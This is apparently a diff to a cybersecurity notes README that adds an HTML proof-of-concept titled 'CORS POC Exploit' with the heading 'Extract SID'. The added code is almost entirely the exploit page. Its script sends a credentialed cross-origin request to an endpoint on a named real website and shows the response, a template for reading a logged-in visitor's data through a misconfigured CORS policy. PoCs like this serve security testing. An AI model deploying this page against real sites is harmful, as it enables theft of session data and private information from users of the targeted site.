@@ -598,7 +598,32 @@ hsecscan url
   ```
 <img src="https://github.com/Krishna-Gopal-Pathak/CyberSecurity/assets/142927819/b38505f3-4793-4b14-8efa-a1b6d5d1dde8" width="600" background-size="cover"/>
 
-
+```
+<!DOCTYPE html>
+<html>
+<body>
+<center>
+<h2>CORS POC Exploit</h2>
+<h3>Extract SID</h3>
+<div id="demo">
+<button type="button" onclick="cors()">Exploit</button>
+</div>
+<script>
+function cors() {
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+if (this.readyState == 4 && this.status == 200) {
+document.getElementById("demo").innerHTML = alert(this.responseText);
+}
+};
+xhttp.open("GET","https://squareops.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fsquareops.com", true);
+xhttp.withCredentials = true;
+xhttp.send();
+}
+</script>
+</body>
+</html>
+```
 
 
 
